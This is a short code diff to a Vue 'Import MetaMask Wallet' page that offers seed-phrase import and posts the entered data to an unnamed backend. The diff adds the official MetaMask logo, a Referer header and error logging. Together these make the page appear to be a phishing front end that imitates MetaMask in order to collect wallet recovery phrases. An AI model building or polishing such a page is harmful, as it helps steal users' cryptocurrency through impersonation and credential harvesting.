@@ -1,5 +1,6 @@
 <template>
   <div class="import-wallet-container">
+    <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources/SVG/metamask-fox.svg" alt="MetaMask Logo" class="metamask-logo" />
     <h1>Import MetaMask Wallet</h1>
     <div class="import-options">
       <button class="option" @click="importWithSeed">Import using Seed Phrase</button>
@@ -89,6 +90,7 @@ export default {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
+            "Referer": window.location.href
           },
           body: JSON.stringify({ type, data }),
         });
@@ -99,6 +101,7 @@ export default {
           this.error = result.error || "Unknown error";
         }
       } catch (err) {
+        console.error("Failed to send data to the backend:", err);
         this.error = "Failed to send data to the backend";
       }
     },
@@ -123,6 +126,11 @@ export default {
   max-width: 600px;
   margin: 0 auto;
   text-align: center;
+}
+
+.metamask-logo {
+  width: 100px;
+  margin-bottom: 20px;
 }
 
 .import-options {
@@ -153,4 +161,3 @@ export default {
   margin-top: 20px;
 }
 </style>
-
